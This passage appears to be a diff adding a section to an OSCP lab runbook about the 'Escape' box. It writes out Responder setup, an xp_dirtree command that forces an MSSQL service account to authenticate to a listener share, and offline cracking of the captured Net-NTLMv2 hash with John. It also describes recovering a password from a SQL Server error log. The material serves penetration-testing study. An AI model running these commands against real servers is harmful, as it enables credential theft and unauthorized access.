@@ -618,3 +618,29 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Payday|Payday]] -- discovered local usernames were tested against SSH with a controlled wordlist before accepting the credential
+
+## Escape: MSSQL Net-NTLMv2 capture and log-based credential recovery
+
+```bash
+# Start the SMB listener before the SQL request is issued.
+sudo responder -I tun0 -wv
+
+# At the MSSQL prompt, force the service account to authenticate to the listener.
+EXEC master..xp_dirtree '\\$LocalIP\share', 1, 1;
+
+# Save the response privately and crack it offline.
+cp "$HOME/.responder/logs/SMB-$LocalIP.txt" "$BoxDir/loot/sql-svc-ntlmv2.txt"
+chmod 600 "$BoxDir/loot/sql-svc-ntlmv2.txt"
+john --wordlist="$Wordlist" "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-john.log"
+john --show "$BoxDir/loot/sql-svc-ntlmv2.txt" \
+  > "$BoxDir/loot/sql-svc-cracked.txt"
+```
+
+The capture is Net-NTLMv2, not an NT hash. Crack it or assess relay conditions. After the password is recovered, validate only the service suggested by the evidence, such as WinRM.
+
+Escape also demonstrated a nonstandard credential source. The UTF-16LE `C:\SQLServer\Logs\ERRORLOG.BAK` file recorded a failed domain logon and a password entered in the username field. Decode the file locally, retain the raw and filtered copies in mode-600 loot, and never paste the typo line into the vault.
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Escape|Escape]], [[OSCP/RUNBOOK V2/Windows - Credential Search|Windows Credential Search]], and [[OSCP/RUNBOOK V2/AD - Credential Validation|AD Credential Validation]].
+
+#### Tags: #Escape #Responder #NetNTLMv2 #JohnTheRipper #CredentialHunting #PasswordReuse
